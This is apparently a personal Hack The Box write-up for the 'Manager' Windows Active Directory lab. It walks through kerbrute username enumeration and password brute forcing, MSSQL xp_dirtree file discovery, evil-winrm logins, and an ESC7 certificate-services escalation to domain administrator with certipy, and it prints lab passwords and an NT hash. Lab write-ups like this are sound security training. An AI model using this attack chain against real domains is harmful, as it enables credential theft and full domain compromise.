# Manager -htb(Compi)(my first AD box)


nmap:

	80,88,135,139,389,445,464,593,636,1433.3268.3269

This is my first AD windows machine , idk shit.

Tools im gonna use to enumerate for usernames :

	Kerbrute.

`./kerbrute_linux_amd64 userenum --dc 10.10.11.236 -d manager.htb /home/kali/Desktop/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt`

that gave us usernames , its a start.

```
2023/10/22 15:13:03 >  [+] VALID USERNAME:       ryan@manager.htb
2023/10/22 15:13:10 >  [+] VALID USERNAME:       guest@manager.htb
2023/10/22 15:13:13 >  [+] VALID USERNAME:       cheng@manager.htb
2023/10/22 15:13:16 >  [+] VALID USERNAME:       raven@manager.htb
2023/10/22 15:13:33 >  [+] VALID USERNAME:       administrator@manager.htb
2023/10/22 15:14:11 >  [+] VALID USERNAME:       Ryan@manager.htb
2023/10/22 15:14:16 >  [+] VALID USERNAME:       Raven@manager.htb
2023/10/22 15:14:34 >  [+] VALID USERNAME:       operator@manager.htb
```

`./kerbrute_linux_amd64 bruteuser --dc 10.10.11.236 -d manager.htb /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-100000.txt Operator -v`

Using the command above, 
found password for Operator user : `operator`

---

Using operator user to logon port 1433 which is MSSQL server:
`impacket-mssqlclient -p 1433 -windows-auth -dc-ip 10.10.11.236 "manager.htb/Operator:operator"@10.10.11.236`


inside MSSQL use these commands to traverse:
	To list databases, you can use the following SQL command:
		`SELECT name FROM sys.databases;`

To switch to that database use:
	`Use databasename`

To list tables in that database:
	`SELECT table_name FROM information_schema.tables;`

To access particular table in a database:
	`SELECT * FROM tablename;`




****Important****:

	so i was stuck in at mssqlclinet , when i type help there should be more options but i got only 5, so i had to reinstall python3 immpacket to work.


Holy shit dude , I was lost for so long in this part xp_dirtree that I got tunnel visioned .
I was only giving concern with what xp_dirtree initally outputted. When I typed xp_dirtree in the mssql client it showed 7 directories and i was searching them over and over again .
I found a .xml file but I couldn't find out what to do. chat gpt and google didnt help because I was asking the wrong questions.

What I did now to fix it,  was:

	There was a IIS website running.
	So it was hosted from someplace, a directory. The sites files are stored there.
	This is where xp_dirtree shines. This command is notorious for traversing directories and listing out files. so what did i do ?.

searched google for IIS website root location , found it:
		`xp_dirtree C:\inetpub\wwwroot`
boom I found the backup of the files in zip.

Downloaded the zip with curl

`sudo curl http://manager.htb/website-backup-27-07-23-old.zip --output website-backup-27-07-23-old.zip`

explored the zip and found user "Raven 's"  password, along with other information.

****don't worry every now and then we get tunnel visioned while hacking. Always think big and out of the box , literally. and dont think hard too much , because in the end , things always turn out to be quite simple.***


----
##### Raven creds:

```
raven@manager.htb
R4v3nBe5tD3veloP3r!123

```

After searching for shits , i found that we need to use this in WinRM:
	Using Evil Win rm we can access the raven windows machine and get the user flag.

	```
	evil-winrm - u raven -i 10.10.11.236
	then password prompt will appear

-----


## ***PRIV ESC***

Figured out this was a AD CS attack, after getting all the hints and also since this is a Windows AD machine, it was bound to have some sort of certificate abuse.


Steps to priv esc:

	Go sudo and download certipy-ad by oliver lyak. pip3 install certipy.

  then using raven creds type this:
  
		  `certipy find -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -vulnerable -enabled
    
This will let you know which type of Certificate template you are vulnerable from. In my case this was `ESC7` certificate template. A certificate template signifies a blueprint for creating digital certificates with specific characteristics and purposes. So there are several misconfigurations during the creation of these templates.

Now the next step is , since we know what our template is , we should directly google it and go to hacktricks. A great article with how to perfectly abuse this template is laid out. Just follow and get root.

 https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#vulnerable-certificate-authority-access-control-esc7

Do attack vector 2.

This article also helped in explain the whys and hows and whats.
	https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/#resources

Basically we will impersonate a Higher level user through the misconfigured certificates in the AD machine. These are time sensivite so copy-paste fast.


	1	certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'

	2    certipy ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'

	3    certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb

You will get error but still it will ask you to save private key, just enter yes. 
Note down the `request id` : 14

	 4    certipy ca -ca 'manager-DC01-CA' -issue-request 14 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'

Till this point, all the commands were time sensitive, meaning you had to enter them fast 1 after another.
If you get access denied , that means you have to enter those previous 3 commands faster.
Just copy paste .

Now we issue the cert/private key and then use that key hash and login with `Evil winRM`.

	5    certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target dc01.manager.htb -retrieve 14

Once we have the certificate, we can use the cert to obtain the cred hash and kerberos ticket of the target DA account using the Certipy `auth` command as shown below:
	
	certipy auth -pfx administrator.pfx


**ERROR** fix :
	If you find this **error** from Linux: `**Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)**` it because of your local time, you need to synchronise the host with the DC. There are a few options

		sudo timedatectl set-ntp 0  - dont use this.
		sudo rdate -n [Machine IP] - using this worked.

after this :

	certipy auth -pfx administrator.pfx
	This generated administrator hash which we will use to login with evil winrm:
	hash : `aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef`
	

---

EVIL WIN RM :
---
	LOGIN with and get ROOT FLAG EZ PZ:

`evil-winrm -i 10.10.11.236 -u administrator -p aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef`



This was my first Active directory machine and it was fun.
